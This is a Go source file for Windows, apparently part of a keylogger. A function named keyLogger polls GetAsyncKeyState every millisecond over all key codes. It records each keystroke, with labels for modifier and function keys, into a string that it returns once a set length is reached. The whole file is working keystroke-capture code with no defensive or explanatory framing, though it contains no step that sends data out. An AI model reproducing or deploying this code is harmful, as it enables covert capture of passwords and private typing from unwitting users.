package main

import (
	"syscall"
	"time"

	"github.com/TheTitanrain/w32"
)

var (
	user32               = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")
	log                  string
)

func keyLogger(length int) string {
	for {
		time.Sleep(1 * time.Millisecond)
		for key := 0; key <= 256; key++ {
			Val, _, _ := procGetAsyncKeyState.Call(uintptr(key))
			if int(Val) == -32767 {
				switch key {
				case w32.VK_CONTROL:
					log += "[Ctrl]"
				case w32.VK_BACK:
					log += "[Back]"
				case w32.VK_TAB:
					log += "[Tab]"
				case w32.VK_RETURN:
					log += "[Enter]"
				case w32.VK_SHIFT:
					log += "[Shift]"
				case w32.VK_MENU:
					log += "[Alt]"
				case w32.VK_CAPITAL:
					log += "[CapsLock]"
				case w32.VK_ESCAPE:
					log += "[Esc]"
				case w32.VK_SPACE:
					log += " "
				case w32.VK_PRIOR:
					log += "[PageUp]"
				case w32.VK_NEXT:
					log += "[PageDown]"
				case w32.VK_END:
					log += "[End]"
				case w32.VK_LEFT:
					log += "[Left]"
				case w32.VK_UP:
					log += "[Up]"
				case w32.VK_RIGHT:
					log += "[Right]"
				case w32.VK_DOWN:
					log += "[Down]"
				case w32.VK_SNAPSHOT:
					log += "[PrintScreen]"
				case w32.VK_DELETE:
					log += "[Delete]"
				case w32.VK_MULTIPLY:
					log += "*"
				case w32.VK_ADD:
					log += "+"
				case w32.VK_SUBTRACT:
					log += "-"
				case w32.VK_DECIMAL:
					log += "."
				case w32.VK_F1:
					log += "[F1]"
				case w32.VK_F2:
					log += "[F2]"
				case w32.VK_F3:
					log += "[F3]"
				case w32.VK_F4:
					log += "[F4]"
				case w32.VK_F5:
					log += "[F5]"
				case w32.VK_F6:
					log += "[F6]"
				case w32.VK_F7:
					log += "[F7]"
				case w32.VK_F8:
					log += "[F8]"
				case w32.VK_F9:
					log += "[F9]"
				case w32.VK_F10:
					log += "[F10]"
				case w32.VK_F11:
					log += "[F11]"
				case w32.VK_F12:
					log += "[F12]"
				case w32.VK_OEM_1:
					log += ";"
				case w32.VK_OEM_2:
					log += "/"
				case w32.VK_OEM_3:
					log += "`"
				case w32.VK_OEM_4:
					log += "["
				case w32.VK_OEM_5:
					log += "\\"
				case w32.VK_OEM_6:
					log += "]"
				case w32.VK_OEM_7:
					log += "'"
				case w32.VK_OEM_PERIOD:
					log += "."
				case 0x30:
					log += "0"
				case 0x31:
					log += "1"
				case 0x32:
					log += "2"
				case 0x33:
					log += "3"
				case 0x34:
					log += "4"
				case 0x35:
					log += "5"
				case 0x36:
					log += "6"
				case 0x37:
					log += "7"
				case 0x38:
					log += "8"
				case 0x39:
					log += "9"
				case 0x41:
					log += "a"
				case 0x42:
					log += "b"
				case 0x43:
					log += "c"
				case 0x44:
					log += "d"
				case 0x45:
					log += "e"
				case 0x46:
					log += "f"
				case 0x47:
					log += "g"
				case 0x48:
					log += "h"
				case 0x49:
					log += "i"
				case 0x4A:
					log += "j"
				case 0x4B:
					log += "k"
				case 0x4C:
					log += "l"
				case 0x4D:
					log += "m"
				case 0x4E:
					log += "n"
				case 0x4F:
					log += "o"
				case 0x50:
					log += "p"
				case 0x51:
					log += "q"
				case 0x52:
					log += "r"
				case 0x53:
					log += "s"
				case 0x54:
					log += "t"
				case 0x55:
					log += "u"
				case 0x56:
					log += "v"
				case 0x57:
					log += "w"
				case 0x58:
					log += "x"
				case 0x59:
					log += "y"
				case 0x5A:
					log += "z"
				}
				if len(log) > length {
					return log
				}
			}
		}
	}
}
